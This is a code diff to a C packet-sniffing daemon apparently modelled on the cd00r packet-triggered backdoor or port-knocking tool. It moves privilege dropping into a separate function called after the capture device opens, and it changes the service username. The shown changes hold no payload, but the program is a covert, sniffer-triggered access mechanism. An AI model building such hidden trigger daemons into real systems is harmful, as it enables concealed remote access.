@@ -16,7 +16,7 @@
 #define SEQUENCE_NUMBER 149112667
 #define OPEN_ACK_NUMBER 777
 #define CLOSE_ACK_NUMBER 333
-#define CD00R_USERNAME "cd00r"
+#define CD00R_USERNAME "joao"
 #define MAX_IP_STRING_LENGTH 16
 #define MAX_COMMAND_LENGTH 8 + MAX_IP_STRING_LENGTH
 
@@ -107,6 +107,19 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
 	}
 }
 
+void dropPermissions(){
+	struct passwd* userInfo = getpwnam(CD00R_USERNAME);
+        if(NULL == userInfo)
+	        exit(-1); //The cd00r user doesnt exist on this system
+        uid_t uid = userInfo->pw_uid;
+	gid_t gid = userInfo->pw_gid;
+
+	if(setgid(gid))
+		exit(-1); //Unable to drop permissions (change group to cd00r)
+
+	if(setuid(uid))
+		exit(-1); //Unable to drop permissions (change user to cd00r)
+}
 
 
 int main(int argc, char** argv)
@@ -123,18 +136,6 @@ int main(int argc, char** argv)
 	const u_char *packet;		/* The actual packet */
 
 	logFile = open("/var/log/cd00rd.log", (O_CREAT | O_WRONLY | O_TRUNC));
-
-        struct passwd* userInfo = getpwnam(CD00R_USERNAME);
-        if(NULL == userInfo)
-	        return (-1); //The cd00r user doesnt exist on this system
-        uid_t uid = userInfo->pw_uid;
-	gid_t gid = userInfo->pw_gid;
-
-	if(setgid(gid))
-		return(-1); //Unable to drop permissions (change group to cd00r)
-
-	if(setuid(uid))
-		return(-1); //Unable to drop permissions (change user to cd00r)
 
 	if(argc > 1)
         	dev = argv[1];
@@ -159,6 +160,10 @@ int main(int argc, char** argv)
 		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
 		return(-1);
 	}	
+        
+	
+	dropPermissions();
+
 
 	sprintf(sniff_port, "%d", SNIFF_PORT);
 	strncat(filter_exp, sniff_port, 7);
